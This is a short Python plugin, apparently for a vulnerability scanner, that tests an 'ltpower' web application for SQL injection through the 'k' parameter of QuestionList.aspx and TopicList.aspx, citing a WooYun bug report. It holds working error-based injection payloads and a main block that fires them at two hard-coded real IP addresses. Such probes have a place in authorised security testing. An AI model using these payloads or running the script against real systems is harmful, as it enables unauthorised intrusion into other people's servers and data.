#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404

#Refer:http://www.wooyun.org/bugs/wooyun-2010-098876

def assign(service,arg):
    if service=="ltpower":
        return True,arg 
    

def  audit(arg):
    ps=[
        "QuestionList.aspx?k=a%27%20having%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%20--",
        "TopicList.aspx?k=a%27%20having%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%20--"
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        if code==500 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
            security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('ltpower','http://58.62.159.2:8081/hudong/')[1])
    audit(assign('ltpower','http://219.222.244.59:20025/')[1])